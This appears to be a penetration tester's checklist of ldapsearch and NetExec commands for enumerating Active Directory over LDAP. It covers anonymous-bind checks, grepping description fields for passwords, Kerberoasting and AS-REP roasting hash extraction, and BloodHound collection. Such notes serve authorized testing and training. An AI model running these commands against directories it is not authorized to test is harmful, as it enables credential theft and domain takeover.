# LDAP enumeration

## The base DN
ldapsearch -x -H ldap://<DCIP> -s base namingcontexts
- [ ] The base DN, such as DC=corp,DC=local, filled in as <BaseDN> below

## Without a credential
ldapsearch -x -H ldap://<DCIP> -b '<BaseDN>' | tee ldap-anon.txt
nxc ldap <DCIP> -u '' -p '' --users
- [ ] Anything back at all means anonymous binds work: read all of it

## With a credential
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' | tee ldap-dump.txt
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --users
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --groups
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --admin-count

## Users and their descriptions
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' '(objectClass=user)' sAMAccountName description info
grep -iE 'description|info|pass|pwd' ldap-dump.txt
- [ ] Every description and info field read: passwords turn up there

A clean list of usernames, one per line:
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' '(objectClass=user)' sAMAccountName | grep '^sAMAccountName:' | cut -d ' ' -f 2 > users.txt

## Accounts worth attacking
Kerberoastable, users with a service principal name:
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --kerberoasting kerberoast.txt
AS-REP roastable, users without Kerberos pre-authentication:
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --asreproast asreproast.txt
Members of Domain Admins:
ldapsearch -x -H ldap://<DCIP> -D '<Username>@<Domain>' -w '<Password>' -b '<BaseDN>' '(memberOf=CN=Domain Admins,CN=Users,<BaseDN>)' sAMAccountName
- [ ] Computers too: (objectClass=computer), for names and operating systems

## Everything for BloodHound
nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --bloodhound --collection All --dns-server <DCIP>
